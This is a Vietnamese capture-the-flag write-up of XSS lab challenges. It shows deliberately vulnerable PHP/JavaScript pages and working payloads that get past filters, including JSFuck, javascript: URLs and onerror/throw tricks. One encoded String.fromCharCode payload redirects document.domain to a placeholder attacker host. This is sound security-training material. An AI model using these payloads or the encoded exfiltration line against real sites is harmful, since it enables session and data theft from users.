---
title: Tui làm XSS
tags: write-up
---

Một ngày đẹp trời vì thấy mình quá gà khi gặp các lỗi XSS nên mình quyết định tìm kiếm thêm các lab XSS để làm và đây là [trang](https://xss.challenge.training.hacq.me/) mình sẽ dùng để tu luyện thêm kỹ năng XSS của bản thân. Okie Gẹt Gô

# Mục tiêu 

Nhập payload làm cho trang web alert `document.domain`

# Baby XSS 01

```html
<script src="hook.js"></script>
<?php
echo $_GET["payload"];
?>

<h1>inject</h1>
<form>
    <input type="text" name="payload" placeholder="your payload here">
    <input type="submit" value="GO">
</form>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

## Phân tích

Đoạn code gây lỗi

```php
echo $_GET["payload"];
```

## Payload

```html
<script>alert(document.domain)</script>
```

# Baby XSS 02
```html
<script src="hook.js"></script>
<script>
    window.addEventListener("load", function() {
        var q = location.hash.substring(1);
        window.query.innerHTML = q == '' ? `Hello!` : (`Hello, ${decodeURI(q)}`);
    });
</script>

<p id="query"></p>

<h1>inject</h1>
<p>Inspect the source code carefully and find where to inject :-)</p>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

## Phân tích

Đây chính là DOM base XSS. Trong đó:
- Source là `location.hash.substring(1)`: sẽ lấy toàn bộ hash part của URL, bao gồm cả ký tự `#`, `substring(1)` sẽ bỏ đi ký tự `#`
- Sink `window.query.innerHTML` sẽ ghi data vào HTML

Ví dụ:

![image](https://hackmd.io/_uploads/B1yGLSa2A.png)

**Lưu ý:**

Nếu tag **`<script></script>`** nằm trong tag **`<p></p>`** thì tag **`<script></script>`** đó sẽ không được trình duyệt thực thi

Thử dùng **`</p>`** để đóng tag lại nhưng không có tác dụng

![image](https://hackmd.io/_uploads/SkHWhB63R.png)

Phương án là ta có thể sử dụng tag **`<img>`**
## Payload

```html
<img src="" onerror=alert(document.domain)>
```

# Baby XSS 03

```html
<script src="hook.js"></script>
<?php
$escaped = htmlspecialchars($_GET['payload']);
?>

<h1>Hello, <?= $escaped ?></h1>
<a href="<?= $escaped ?>/friends">Friends</a>
<a href="<?= $escaped ?>/post">Posts</a>
<a href="<?= $escaped ?>/settings">Settings</a>

<h1>inject</h1>
<form>
    <input type="text" name="payload" placeholder="your payload here">
    <input type="submit" value="GO">
</form>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

## Phân tích

Hàm `htmlspecialchars` của PHP được sử dụng để chuyển đổi các ký tự đặc biệt (`<`, ... ) thành các thực thể HTML (`&lt`, ...)

Input sau khi được chuyển đổi hết các ký tự đặc biệt sẽ được lưu vào attribute **href** 

Nếu được inject vào attribute href ta có thể sử dụng `javascript` psuedo-protocol

## Payload

```
javascript:alert(document.domain)
```

# Baby XSS 04

```html
<script src="hook.js"></script>
<?php
// by escaping the payload you won't break this system, haha! :-)
$escaped = preg_replace("/[`<>ux]\\/", "", $_GET['payload']);
?>

<script>
    window.addEventListener("load", function() {
        var name = `<?= $escaped ?>`;
        window.greeting.innerHTML = (name == '' ? 'こんにちは!' : name + 'さん, こんにちは!');
    });
</script>

<p id="greeting"></p>

<h1>inject</h1>
<form>
    <input type="text" name="payload" placeholder="your payload here">
    <input type="submit" value="GO">
</form>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

## Phân tích 

![image](https://hackmd.io/_uploads/BJNz6cpnA.png)

Có vẻ challenge này đã bị lỗi nên mình sẽ skip qua challenge này :3 

# No Alphabets and Digits

```html
<script src="hook.js"></script>
<?php
// by escaping the payload you won't break this system, haha! :-)
$escaped = preg_replace("/[a-zA-Z0-9]/", "", $_GET['payload']);
?>

<script>
    // here you can inject an arbitrary script,
    // but I guess you can't do anything, cuz the script can't include a-zA-Z0-9 ! :-)
    <?= $escaped ?>
</script>


<h1>inject</h1>
<form>
    <input type="text" name="payload" placeholder="your payload here">
    <input type="submit" value="GO">
</form>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

## Phân tích 

Đoạn code cho phép ta nhập input vào giữa tag `<script>` nhưng không cho phép nhập chữ và số =))

Ở đây là có thể sử dụng JSFuck - một style lập trình rất khó hiểu dựa trên những thành phần cốt lõi của javascript. Nó chỉ sử dụng 6 ký tự để viết và chạy code

Ta có thể sử dụng trang sau để chuyển đổi từ code javascript bình thuờng thành jsfuck https://jsfuck.com/

![image](https://hackmd.io/_uploads/SyGURhLTC.png)

Copy đoạn mã và gửi lên server

![image](https://hackmd.io/_uploads/BJxeCR2UpA.png)

Lúc này ta sẽ thấy payload được trình duyệt thực thi

## 

```javascript
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()
```

# No Parentheses

```html
<script src="hook.js"></script>
<?php
// you cannot do anything without ...

// no parentheses ...
$escaped = preg_replace("/[()]/", "", $_GET['payload']);

// no event handlers!
$escaped = preg_replace("/.*o.*n.*/i", "", $escaped);
?>

<h1>Hello, <?= $escaped ?>!</h1>


<h1>inject</h1>
<form>
    <input type="text" name="payload" placeholder="your payload here">
    <input type="submit" value="GO">
</form>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

## Phân tích

Challenge này sẽ không cho phép chúng ta dùng dấu `()` và input sẽ không được xuất hiện ký tự `o` rồi tới `n` -> mục đích là để filter event handlers

## Payload

Sau đây là một số các payload mà mình có thể nghĩ ra được:

```
<script>alert`XSS`</script>
```

```
<script>setTimeout`alert\x28'XSS'\x29`</script>
```

```
<script>setTimeout`alert\x28self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]
        ["\x64\x6f\x6d\x61\x69\x6e"]\x29`</script>
```

```
<iframe src="javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29"></iframe>
```

## Nguồn
https://melotover.medium.com/how-i-bypassed-a-tough-waf-to-steal-user-cookies-using-xss-da75f28108e4
https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/

# No Quotes

```html
<script src="hook.js"></script>
<?php
// by escaping the payload you won't break this system, haha! :-)
$escaped = preg_replace("/['\"`&#]/", "", $_GET['payload']);
?>

<h1>Hello, <?= $escaped ?>!</h1>

<h1>inject</h1>
<form>
    <input type="text" name="payload" placeholder="your payload here">
    <input type="submit" value="GO">
</form>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

## Phân tích 

Challenge này sẽ không có phép chúng ta sử dụng single quote, double quotes, backtick, ampersand, number sign

## Payload

```
<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()</script>
```

```
<script>alert(String.fromCharCode(88,83,83))</script>
```

```
<script>alert(document.domain)</script>
```

```
<img src=x onerror=alert(document.domain)>
```

Một trang web giúp mình encode javascript code thành String.fromCharCode
https://eve.gd/2007/05/23/string-fromcharcode-encoder/

```
<script>eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,115,117,112,101,114,101,118,105,108,119,101,98,46,99,111,109,63,99,61,34,43,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,59))</script>
```

# No Parentheses Again

```html
<script src="hook.js"></script>
<?php
$escaped = preg_replace("/[`()<>&#]/", "", $_GET['payload']);
?>

<h1>Hello, <span id="<?= $escaped ?>"><?= htmlspecialchars($_GET['payload']) ?></span>!</h1>

<h1>inject</h1>
<form>
    <input type="text" name="payload" placeholder="your payload here">
    <input type="submit" value="GO">
</form>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

## Phân tích

Challenge này ngăn chúng ta sử dụng `<` tuy nhiên vị trí inject lại nằm ở thuộc tính id và nằm trong tag `<span></span>`

![image](https://hackmd.io/_uploads/Hyp4HXtp0.png)

Một vài lưu ý mà ta có thể nghĩ đến ngay:
- Tag `<script>` nằm bên trong tag `<span></span>` sẽ không được thực thi 
- Payload nằm trong tag span sẽ bị **htmlspecialchars** 
- Thuộc tính `autofocus` không hoạt động trên tag `<span></span>`
- Filter `&#` => Không dùng HTML encode được
- Filter `<>` => Không đóng mở tag được 

Trong JavaScript, **error handler** là một **window object**. 

Điều này có nghĩa là nếu chúng ta gán cho nó một function, thì chúng ta có thể gọi được function đó bằng cách tạo ra một error 

**Throw** là một cách để truyền tham số cho **error handler**

Ví dụ:

```javascript
error=alert; throw 1;
// result alert 1 

error=eval; throw '=alert\x281\x29'
```

Trong trường hợp challenge này:

```javascript
" onclick="window.onerror=eval;throw '=alert\u0028\'XSS\'\u0029'"
```

Payload trên sẽ gán function **eval** cho **error handler** sau đó truyền tham số đến cho function **eval** bằng **throw** function

Lưu ý:
 - Ta không cần một lỗi thực tế để trigger error
 - **throw** statement được sử dụng để truyền string `=alert\u0028\'XSS\'\u0029`
 - Khi sử dụng **onerror** mà không có **window**, nó sẽ tham chiếu tới biến cục bộ, không giống với biến toàn cục **window.onerror**

## Payload

```
" onclick="window.onerror=eval;throw '=alert\u0028\'XSS\'\u0029'"
```

```
" onclick="window.onerror=eval;throw '=alert\u0028document.domain\u0029'"
```

## Nguồn:
https://graneed.hatenablog.com/entry/2018/11/23/222842#Case-08-2-Without-any-backquotes-parentheses-HTML-tags-and-
http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/

